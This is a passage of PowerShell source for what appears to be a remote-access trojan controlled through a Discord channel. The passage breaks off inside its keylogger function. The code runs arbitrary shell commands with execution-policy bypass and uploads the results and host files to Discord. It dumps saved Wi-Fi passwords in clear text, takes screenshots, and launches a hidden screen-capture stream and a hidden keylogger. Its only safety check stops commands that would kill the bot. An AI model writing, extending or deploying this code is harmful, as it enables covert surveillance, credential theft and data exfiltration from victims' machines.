function Log { param([string]$msg, [string]$color = "Gray")
    if (-not $script:silent) { Write-Host $msg -ForegroundColor $color }
}
function LogA { param([string]$msg, [string]$color = "Gray")
    Write-Host $msg -ForegroundColor $color
}

function Test-Dangerous {
    param([string]$Command)
    if (-not $Command) { return $null }
    $c = $Command.ToLower()
    $p = $script:myPid
    if ($c -match "taskkill.*\/pid\s+$p\b") { return "kill bot PID $p" }
    if ($c -match "stop-process.*-id\s+$p\b") { return "kill bot PID $p" }
    if ($c -match "taskkill.*\/im\s+powershell\.exe") { return "kill all powershell" }
    if ($c -match "taskkill.*\/im\s+pwsh\.exe") { return "kill all pwsh" }
    return $null
}

function Send-DiscordMessage {
    param([string]$Content, [string]$ReplyToId = $null, [switch]$NoTag)
    if ($null -eq $Content) { $Content = "" }
    $Content = [string]$Content
    if ($Content.Length -eq 0) { $Content = "(empty)" }
    if (-not $NoTag) { $Content = "$($script:tag) $Content" }
    $maxLen = 1900
    try { $v = [int]$script:maxMsgLen; if ($v -gt 0 -and $v -le 2000) { $maxLen = $v } } catch { }
    $chunks = New-Object System.Collections.ArrayList
    $remain = $Content
    while ($remain.Length -gt $maxLen) {
        $take = [Math]::Min($maxLen, $remain.Length)
        if ($take -le 0) { break }
        [void]$chunks.Add($remain.Substring(0, $take))
        $remain = $remain.Substring($take)
    }
    if ($remain.Length -gt 0) { [void]$chunks.Add($remain) }
    if ($chunks.Count -eq 0) { [void]$chunks.Add("(empty)") }
    $first = $true
    foreach ($chunk in $chunks) {
        $body = @{ content = [string]$chunk }
        if ($first -and $ReplyToId) { $body.message_reference = @{ message_id = $ReplyToId } }
        $json  = $body | ConvertTo-Json -Compress -Depth 5
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        $ok = $false; $n = 0
        while (-not $ok -and $n -lt 3) {
            $n++
            try {
                Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages" -Headers $headers -Method Post -Body $bytes -ContentType "application/json; charset=utf-8" | Out-Null
                $ok = $true
            } catch {
                $c = $null; try { $c = [int]$_.Exception.Response.StatusCode } catch {}
                if ($c -eq 429) { Start-Sleep -Seconds 2 } else { Start-Sleep -Milliseconds 500 }
            }
        }
        $first = $false
        Start-Sleep -Milliseconds 250
    }
}

function Send-CodeBlock {
    param([string]$Title, [string]$Body, [string]$ReplyToId = $null)
    if ($null -eq $Body) { $Body = "" }
    $Body = [string]$Body
    if ([string]::IsNullOrWhiteSpace($Body)) { $Body = "(no output)" }
    $zwsp = [char]0x200B
    try { $Body = $Body.Replace('```', "``$zwsp``$zwsp``") } catch { }
    $limit = 1700
    if ($Body.Length -gt $limit) {
        $take = [Math]::Min($limit, $Body.Length)
        if ($take -gt 0) { $Body = $Body.Substring(0, $take) + "`n...[TRUNC]" }
    }
    Send-DiscordMessage -Content "**$Title**`n``````n$Body`n``````" -ReplyToId $ReplyToId
}

function Send-DiscordFile {
    param([string]$FilePath, [string]$Content = "", [string]$ReplyToId = $null)
    if (-not (Test-Path -LiteralPath $FilePath)) {
        Send-DiscordMessage -Content "File not found: $FilePath" -ReplyToId $ReplyToId; return
    }
    $fInfo = Get-Item -LiteralPath $FilePath
    if ($fInfo.PSIsContainer) {
        Send-DiscordMessage -Content "Not a file: $FilePath" -ReplyToId $ReplyToId; return
    }
    if ($fInfo.Length -gt ($script:maxUploadMB * 1MB)) {
        Send-DiscordMessage -Content "File too big ($([math]::Round($fInfo.Length/1MB,2)) MB > $($script:maxUploadMB) MB)" -ReplyToId $ReplyToId
        return
    }
    $c = if ($Content) { "$($script:tag) $Content" } else { $script:tag }
    $payload = @{ content = $c }
    if ($ReplyToId) { $payload.message_reference = @{ message_id = $ReplyToId } }
    $json = $payload | ConvertTo-Json -Compress -Depth 5

    $boundary = "----AgentBoundary$([System.Guid]::NewGuid().ToString('N'))"
    $LF  = "`r`n"
    $enc = [System.Text.Encoding]::UTF8
    $ms  = New-Object System.IO.MemoryStream

    $safeName = ($fInfo.Name -replace '[\\/:*?"<>|]', '_')

    $b1 = $enc.GetBytes("--$boundary$LF")
    $ms.Write($b1, 0, $b1.Length)
    $b2 = $enc.GetBytes("Content-Disposition: form-data; name=`"payload_json`"$LF")
    $ms.Write($b2, 0, $b2.Length)
    $b3 = $enc.GetBytes("Content-Type: application/json$LF$LF")
    $ms.Write($b3, 0, $b3.Length)
    $b4 = $enc.GetBytes("$json$LF")
    $ms.Write($b4, 0, $b4.Length)
    $b5 = $enc.GetBytes("--$boundary$LF")
    $ms.Write($b5, 0, $b5.Length)
    $b6 = $enc.GetBytes("Content-Disposition: form-data; name=`"files[0]`"; filename=`"$safeName`"$LF")
    $ms.Write($b6, 0, $b6.Length)
    $b7 = $enc.GetBytes("Content-Type: application/octet-stream$LF$LF")
    $ms.Write($b7, 0, $b7.Length)
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $ms.Write($fileBytes, 0, $fileBytes.Length)
    $b8 = $enc.GetBytes("$LF--$boundary--$LF")
    $ms.Write($b8, 0, $b8.Length)

    $body = $ms.ToArray()
    $ms.Close(); $ms.Dispose()

    $ok = $false; $n = 0
    while (-not $ok -and $n -lt 3) {
        $n++
        try {
            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages" -Headers $headers -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" | Out-Null
            $ok = $true
        } catch {
            $code = $null; try { $code = [int]$_.Exception.Response.StatusCode } catch {}
            if ($code -eq 429) { Start-Sleep -Seconds 2 } else { Start-Sleep -Milliseconds 700 }
        }
    }
}

function Get-AutoTimeout {
    param([string]$Command)
    $c = $Command.ToLower().Trim()
    if ($c -match '^(sfc|chkdsk|dism|msinfo32|dxdiag|defrag|robocopy|wusa|dism\.exe)') { return 600000 }
    if ($c -match '^(wmic|driverquery|systeminfo|net\s+start|net\s+stop|sc\s+start|sc\s+stop|gpupdate|gpresult)') { return 120000 }
    return $script:cmdTimeoutMs
}

function Invoke-CmdCommand {
    param([string]$Command, [int]$TimeoutMs = 0)
    $danger = Test-Dangerous -Command $Command
    if ($danger) { return "REFUSED: $danger" }
    if ($TimeoutMs -le 0) { $TimeoutMs = Get-AutoTimeout -Command $Command }
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    $tmp = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "a_$([guid]::NewGuid().ToString('N')).bat")
    $bat = "@echo off`r`nchcp 65001>nul 2>&1`r`n$Command`r`n"
    try { [System.IO.File]::WriteAllText($tmp, $bat, $script:utf8NoBom) }
    catch { return "WRITE-ERR: $_" }
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $script:cmdExe
    $psi.Arguments = "/d /c `"`"$tmp`"`""
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError  = $true
    $psi.RedirectStandardInput  = $true
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow  = $true
    $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
    $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
    $psi.WorkingDirectory = $script:workDir
    try {
        $p = [System.Diagnostics.Process]::Start($psi)
        try { $p.StandardInput.Close() } catch {}
        $o = $p.StandardOutput.ReadToEndAsync()
        $e = $p.StandardError.ReadToEndAsync()
        if (-not $p.WaitForExit($TimeoutMs)) {
            $kpid = $p.Id
            try { & taskkill.exe /F /T /PID $kpid 2>&1 | Out-Null } catch { try { $p.Kill() } catch {} }
            Start-Sleep -Milliseconds 500
            if (-not $p.HasExited) { try { $p.Kill() } catch {} }
            return "TIMEOUT $([int]($TimeoutMs/1000))s (PID $kpid)"
        }
        $out = $o.Result; $err = $e.Result; $sw.Stop()
        $r = ""
        if ($out) { $r += [string]$out }
        if ($err) { if ($r) { $r += "`n" }; $r += "[STDERR]`n" + [string]$err }
        if (-not $r) { $r = "(no output)" }
        if ($p.ExitCode -ne 0) { $r += "`n[Exit: $($p.ExitCode)]" }
        $r += "`n[$($sw.ElapsedMilliseconds)ms]"
        return [string]$r
    } catch { return "ERR: $_" }
    finally { if (Test-Path -LiteralPath $tmp) { Remove-Item $tmp -Force -EA SilentlyContinue } }
}

function Invoke-PSCommand {
    param([string]$Command, [int]$TimeoutMs = 0)
    $danger = Test-Dangerous -Command $Command
    if ($danger) { return "REFUSED: $danger" }
    if ($TimeoutMs -le 0) { $TimeoutMs = Get-AutoTimeout -Command $Command }
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $script:psExe
    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $enc"
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError  = $true
    $psi.RedirectStandardInput  = $true
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow  = $true
    $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
    $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
    $psi.WorkingDirectory = $script:workDir
    try {
        $p = [System.Diagnostics.Process]::Start($psi)
        try { $p.StandardInput.Close() } catch {}
        $o = $p.StandardOutput.ReadToEndAsync()
        $e = $p.StandardError.ReadToEndAsync()
        if (-not $p.WaitForExit($TimeoutMs)) {
            $kpid = $p.Id
            try { & taskkill.exe /F /T /PID $kpid 2>&1 | Out-Null } catch { try { $p.Kill() } catch {} }
            Start-Sleep -Milliseconds 500
            if (-not $p.HasExited) { try { $p.Kill() } catch {} }
            return "TIMEOUT $([int]($TimeoutMs/1000))s (PID $kpid)"
        }
        $out = $o.Result; $err = $e.Result; $sw.Stop()
        $r = ""
        if ($out) { $r += [string]$out }
        if ($err) { if ($r) { $r += "`n" }; $r += "[STDERR]`n" + [string]$err }
        if (-not $r) { $r = "(no output)" }
        if ($p.ExitCode -ne 0) { $r += "`n[Exit: $($p.ExitCode)]" }
        $r += "`n[$($sw.ElapsedMilliseconds)ms]"
        return [string]$r
    } catch { return "ERR: $_" }
}

function Take-Screenshot {
    param([string]$Path)
    try {
        $ps1 = Join-Path $env:TEMP "ss_$(Get-Random).ps1"
        $pathB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Path))
        $code = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$path = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$pathB64'))
`$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height
`$g = [System.Drawing.Graphics]::FromImage(`$bmp)
`$g.CopyFromScreen(`$b.Location, [System.Drawing.Point]::Empty, `$b.Size)
`$bmp.Save(`$path, [System.Drawing.Imaging.ImageFormat]::Png)
`$g.Dispose()
`$bmp.Dispose()
"@
        $code | Out-File -FilePath $ps1 -Encoding UTF8 -Force
        & $script:psExe -NoProfile -STA -ExecutionPolicy Bypass -File $ps1 2>&1 | Out-Null
        Remove-Item $ps1 -Force -EA SilentlyContinue
        return (Test-Path $Path)
    } catch { return $false }
}

function Test-Admin {
    try { ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { $false }
}

function Get-WifiPasswords {
    try {
        $p = (netsh wlan show profiles) -split "`n" | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        $o = @()
        foreach ($n in $p) {
            $k = (netsh wlan show profile name="$n" key=clear) -split "`n" | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
            $o += "$n : $(if($k){$k}else{'(none)'})"
        }
        return ($o -join "`n")
    } catch { return "err: $_" }
}

function Download-DiscordAttachment {
    param($Message, [string]$SaveDir = $null)
    if (-not $Message.attachments -or $Message.attachments.Count -eq 0) { return @() }
    if (-not $SaveDir) { $SaveDir = $script:workDir }
    if (-not (Test-Path -LiteralPath $SaveDir)) { New-Item -ItemType Directory -Path $SaveDir -Force | Out-Null }
    $saved = @()
    foreach ($att in $Message.attachments) {
        try {
            $safeName = ($att.filename -replace '[\\/:*?"<>|]', '_')
            $path = Join-Path $SaveDir $safeName
            $i = 1
            $baseName = [System.IO.Path]::GetFileNameWithoutExtension($safeName)
            $ext = [System.IO.Path]::GetExtension($safeName)
            while (Test-Path -LiteralPath $path) { $path = Join-Path $SaveDir "$baseName`_$i$ext"; $i++ }
            Invoke-WebRequest -Uri $att.url -OutFile $path -UseBasicParsing -Headers @{ "User-Agent" = "DiscordBot" }
            $saved += $path
        } catch { }
    }
    return $saved
}

# ==================== CAPTURE STREAM ====================
function Start-CaptureStream {
    param([int]$Fps = 1, [int]$Quality = 60, [int]$MaxSeconds = 0, [int]$Monitor = 0)
    if ($script:capturePid) {
        $p = Get-Process -Id $script:capturePid -EA SilentlyContinue
        if ($p) { return "already running (PID $($script:capturePid))" }
        $script:capturePid = $null
    }
    Remove-Item -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
    Remove-Item -LiteralPath $script:captureErrFile  -Force -EA SilentlyContinue

    $childPath = Join-Path $env:TEMP "dag_cap_$([guid]::NewGuid().ToString('N')).ps1"
    [System.IO.File]::WriteAllText($childPath, $script:CaptureChildCode, $script:utf8NoBom)

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName  = $script:psExe
    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$childPath`""
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow  = $true
    $psi.WindowStyle     = "Hidden"
    $psi.EnvironmentVariables["DAG_TOKEN"]    = $script:token
    $psi.EnvironmentVariables["DAG_CHANNEL"]  = $script:channelId
    $psi.EnvironmentVariables["DAG_FPS"]      = "$Fps"
    $psi.EnvironmentVariables["DAG_QUALITY"]  = "$Quality"
    $psi.EnvironmentVariables["DAG_MAXSEC"]   = "$MaxSeconds"
    $psi.EnvironmentVariables["DAG_MONITOR"]  = "$Monitor"
    $psi.EnvironmentVariables["DAG_KILLFILE"] = $script:captureKillFile
    $psi.EnvironmentVariables["DAG_ERRLOG"]   = $script:captureErrFile

    try {
        $proc = [System.Diagnostics.Process]::Start($psi)
        $script:capturePid   = $proc.Id
        $script:captureStart = Get-Date
        "$($proc.Id)" | Set-Content -LiteralPath $script:capturePidFile -Force -EA SilentlyContinue
        $secStr = if ($MaxSeconds -le 0) { "inf" } else { "${MaxSeconds}s" }
        return "PID $($proc.Id) | fps=$Fps q=$Quality max=$secStr mon=$Monitor"
    } catch {
        return "spawn fail: $_"
    }
}

function Stop-CaptureStream {
    if (-not $script:capturePid) {
        if (Test-Path -LiteralPath $script:capturePidFile) {
            try { $script:capturePid = [int](Get-Content -LiteralPath $script:capturePidFile -Raw) } catch { }
        }
        if (-not $script:capturePid) { return "not running" }
    }
    $oldPid = $script:capturePid
    "stop" | Set-Content -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
    Start-Sleep -Milliseconds 700
    $p = Get-Process -Id $oldPid -EA SilentlyContinue
    if ($p) { try { & taskkill.exe /F /T /PID $oldPid 2>&1 | Out-Null } catch { try { $p.Kill() } catch {} } }
    $script:capturePid   = $null
    $script:captureStart = $null
    Remove-Item -LiteralPath $script:capturePidFile -Force -EA SilentlyContinue
    Remove-Item -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
    return "stopped PID $oldPid"
}

# ==================== KEYLOG ====================
function Start-KeyLog {
    if ($script:keylogPid) {
        $p = Get-Process -Id $script:keylogPid -EA SilentlyContinue
        if ($p) { return "already running (PID $($script:keylogPid))" }
        $script:keylogPid = $null
    }
    Remove-Item -LiteralPath $script:keylogKillFile -Force -EA SilentlyContinue

    $childPath = Join-Path $env:TEMP "dag_klog_$([guid]::NewGuid().ToString('N')).ps1"
    [System.IO.File]::WriteAllText($childPath, $script:KeylogChildCode, $script:utf8NoBom)

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName  = $script:psExe
    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$childPath`""
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow  = $true
    $psi.WindowStyle     = "Hidden"
    $psi.EnvironmentVariables["DAG_KILLFILE"] = $script:keylogKillFile
    $psi.EnvironmentVariables["DAG_LOGFILE"]  = $script:keylogLogFile

    try {
        $proc = [System.Diagnostics.Process]::Start($psi)
        $script:keylogPid   = $proc.Id
        $script:keylogStart = Get-Date
        "$($proc.Id)" | Set-Content -LiteralPath $script:keylogPidFile -Force
        return "Keylog started | PID $($proc.Id)"
